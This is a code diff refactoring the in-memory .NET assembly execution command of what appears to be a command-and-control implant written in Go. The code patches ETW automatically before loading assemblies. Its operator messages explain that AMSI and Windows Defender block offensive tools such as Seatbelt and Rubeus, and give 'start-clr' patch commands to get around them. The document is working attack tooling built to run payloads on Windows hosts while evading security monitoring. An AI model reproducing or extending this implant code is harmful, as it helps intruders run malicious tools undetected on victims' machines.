@@ -109,7 +109,7 @@ func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				loadErr = fmt.Errorf("PANIC during LoadAssembly: %w", r)
+				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
 			}
 		}()
 		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
@@ -131,7 +131,7 @@ func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %w", r)
+				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
 			}
 		}()
 		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
@@ -182,7 +182,7 @@ type InlineAssemblyParams struct {
 func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult {
 	// Ensure we're on Windows
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	// Parse parameters
@@ -193,17 +193,17 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 
 	// Validate assembly_b64
 	if params.AssemblyB64 == "" {
-		return errorResult("Error: No assembly data provided")
+		return errorResult("No assembly data provided")
 	}
 
 	// Decode the base64-encoded assembly
 	assemblyBytes, err := base64.StdEncoding.DecodeString(params.AssemblyB64)
 	if err != nil {
-		return errorf("Error decoding assembly: %v", err)
+		return errorf("decoding assembly: %v", err)
 	}
 
 	if len(assemblyBytes) == 0 {
-		return errorResult("Error: Assembly data is empty")
+		return errorResult("Assembly data is empty")
 	}
 
 	// Parse arguments string into array
@@ -220,45 +220,10 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		output.WriteString(fmt.Sprintf("[*] Arguments: %s\n", params.Arguments))
 	}
 
-	// Ensure CLR is started (Merlin approach: keep persistent runtime host)
-	// Lock only during CLR initialization
-	assemblyMutex.Lock()
-	if !clrStarted {
-		output.WriteString("[*] Starting CLR v4...\n")
-
-		// Redirect STDOUT/STDERR once when starting CLR
-		err = clr.RedirectStdoutStderr()
-		if err != nil {
-			output.WriteString(fmt.Sprintf("Warning: Could not redirect output: %v\n", err))
-		}
-
-		// Retry LoadCLR up to 3 times — go-clr's GetInterface call sometimes
-		// returns a spurious "file not found" error on first invocation
-		var loadErr error
-		for attempt := 1; attempt <= 3; attempt++ {
-			runtimeHost, loadErr = clr.LoadCLR("v4")
-			if loadErr == nil {
-				break
-			}
-			if strings.Contains(loadErr.Error(), "cannot find the file") {
-				output.WriteString(fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt))
-				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
-				continue
-			}
-			break
-		}
-		if loadErr != nil {
-			assemblyMutex.Unlock()
-			output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", loadErr))
-			return errorResult(output.String())
-		}
-		clrStarted = true
-		output.WriteString("[+] CLR started successfully\n")
-		output.WriteString("[!] WARNING: CLR auto-started without AMSI patching.\n")
-		output.WriteString("[!] Offensive assemblies may be blocked by Windows Defender.\n")
-		output.WriteString("[!] For best results, run 'start-clr' with Autopatch first.\n")
+	if clrErr := ensureCLRStarted(&output); clrErr != nil {
+		output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", clrErr))
+		return errorResult(output.String())
 	}
-	assemblyMutex.Unlock()
 
 	// Auto-patch ETW before loading assembly — CLR emits Assembly.Load events
 	if !etwPatched {
@@ -273,56 +238,10 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		}
 	}
 
-	// Step 1: Load the assembly (Merlin approach)
-	output.WriteString("[*] Loading assembly into CLR...\n")
-
-	var methodInfo *clr.MethodInfo
-	var loadErr error
-
-	// Lock only during LoadAssembly call
-	assemblyMutex.Lock()
-	func() {
-		defer func() {
-			if r := recover(); r != nil {
-				loadErr = fmt.Errorf("PANIC during LoadAssembly: %w", r)
-			}
-		}()
-
-		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
-	}()
-	assemblyMutex.Unlock()
-
+	methodInfo, loadErr := loadAssemblyWithRecovery(assemblyBytes, &output)
 	if loadErr != nil {
-		output.WriteString("\n=== LOAD ERROR ===\n")
-		output.WriteString(fmt.Sprintf("%v\n\n", loadErr))
-
-		// Check for AMSI-blocked indicator: HRESULT 0x8007000b (COR_E_BADIMAGEFORMAT)
-		// AMSI hooks Assembly.Load() and returns BadImageFormatException when it detects
-		// known offensive tools (Seatbelt, Rubeus, SharpUp, etc.)
-		if strings.Contains(loadErr.Error(), "0x8007000b") && !amsiPatched {
-			output.WriteString("*** LIKELY CAUSE: AMSI is blocking this assembly ***\n")
-			output.WriteString("AMSI (Anti-Malware Scan Interface) scans assemblies during CLR loading.\n")
-			output.WriteString("Well-known offensive tools are flagged and blocked with 0x8007000b.\n\n")
-			output.WriteString("FIX: Run 'start-clr' with AMSI patch BEFORE loading assemblies:\n")
-			output.WriteString("  start-clr {\"amsi_patch\": \"Autopatch\", \"etw_patch\": \"Autopatch\"}\n")
-			output.WriteString("  OR\n")
-			output.WriteString("  start-clr {\"amsi_patch\": \"Hardware Breakpoint\", \"etw_patch\": \"Hardware Breakpoint\"}\n\n")
-		}
-
-		output.WriteString("Troubleshooting tips:\n")
-		if !amsiPatched {
-			output.WriteString("  - Run 'start-clr' with AMSI Autopatch or Hardware Breakpoint before executing assemblies\n")
-		}
-		output.WriteString("  - Ensure the assembly is a valid .NET Framework executable (.exe)\n")
-		output.WriteString("  - Ensure it targets .NET Framework 4.x (not .NET Core/.NET 5+)\n")
-		output.WriteString("  - Check that the assembly has a valid Main() entry point\n")
-		output.WriteString("  - Verify the assembly is not corrupted\n")
-		output.WriteString(fmt.Sprintf("  - Assembly size: %d bytes\n", len(assemblyBytes)))
-
 		return errorResult(output.String())
 	}
-
-	output.WriteString("[+] Assembly loaded successfully\n")
 
 	// Step 2: Invoke the assembly (Merlin approach)
 	output.WriteString(fmt.Sprintf("[*] Invoking assembly with %d argument(s)...\n", len(args)))
@@ -335,7 +254,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
-				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %w", r)
+				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
 			}
 		}()
 
@@ -375,4 +294,79 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	}
 
 	return successResult(output.String())
+}
+
+func ensureCLRStarted(output *strings.Builder) error {
+	assemblyMutex.Lock()
+	defer assemblyMutex.Unlock()
+	if clrStarted {
+		return nil
+	}
+	output.WriteString("[*] Starting CLR v4...\n")
+	if err := clr.RedirectStdoutStderr(); err != nil {
+		output.WriteString(fmt.Sprintf("Warning: Could not redirect output: %v\n", err))
+	}
+	var loadErr error
+	for attempt := 1; attempt <= 3; attempt++ {
+		runtimeHost, loadErr = clr.LoadCLR("v4")
+		if loadErr == nil {
+			break
+		}
+		if strings.Contains(loadErr.Error(), "cannot find the file") {
+			output.WriteString(fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt))
+			jitterSleep(300*time.Millisecond, 700*time.Millisecond)
+			continue
+		}
+		break
+	}
+	if loadErr != nil {
+		return loadErr
+	}
+	clrStarted = true
+	output.WriteString("[+] CLR started successfully\n")
+	output.WriteString("[!] WARNING: CLR auto-started without AMSI patching.\n")
+	output.WriteString("[!] Offensive assemblies may be blocked by Windows Defender.\n")
+	output.WriteString("[!] For best results, run 'start-clr' with Autopatch first.\n")
+	return nil
+}
+
+func loadAssemblyWithRecovery(assemblyBytes []byte, output *strings.Builder) (*clr.MethodInfo, error) {
+	output.WriteString("[*] Loading assembly into CLR...\n")
+	var methodInfo *clr.MethodInfo
+	var loadErr error
+	assemblyMutex.Lock()
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
+			}
+		}()
+		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
+	}()
+	assemblyMutex.Unlock()
+	if loadErr != nil {
+		output.WriteString("\n=== LOAD ERROR ===\n")
+		output.WriteString(fmt.Sprintf("%v\n\n", loadErr))
+		if strings.Contains(loadErr.Error(), "0x8007000b") && !amsiPatched {
+			output.WriteString("*** LIKELY CAUSE: AMSI is blocking this assembly ***\n")
+			output.WriteString("AMSI (Anti-Malware Scan Interface) scans assemblies during CLR loading.\n")
+			output.WriteString("Well-known offensive tools are flagged and blocked with 0x8007000b.\n\n")
+			output.WriteString("FIX: Run 'start-clr' with AMSI patch BEFORE loading assemblies:\n")
+			output.WriteString("  start-clr {\"amsi_patch\": \"Autopatch\", \"etw_patch\": \"Autopatch\"}\n")
+			output.WriteString("  OR\n")
+			output.WriteString("  start-clr {\"amsi_patch\": \"Hardware Breakpoint\", \"etw_patch\": \"Hardware Breakpoint\"}\n\n")
+		}
+		output.WriteString("Troubleshooting tips:\n")
+		if !amsiPatched {
+			output.WriteString("  - Run 'start-clr' with AMSI Autopatch or Hardware Breakpoint before executing assemblies\n")
+		}
+		output.WriteString("  - Ensure the assembly is a valid .NET Framework executable (.exe)\n")
+		output.WriteString("  - Ensure it targets .NET Framework 4.x (not .NET Core/.NET 5+)\n")
+		output.WriteString("  - Check that the assembly has a valid Main() entry point\n")
+		output.WriteString("  - Verify the assembly is not corrupted\n")
+		output.WriteString(fmt.Sprintf("  - Assembly size: %d bytes\n", len(assemblyBytes)))
+		return nil, loadErr
+	}
+	output.WriteString("[+] Assembly loaded successfully\n")
+	return methodInfo, nil
 }
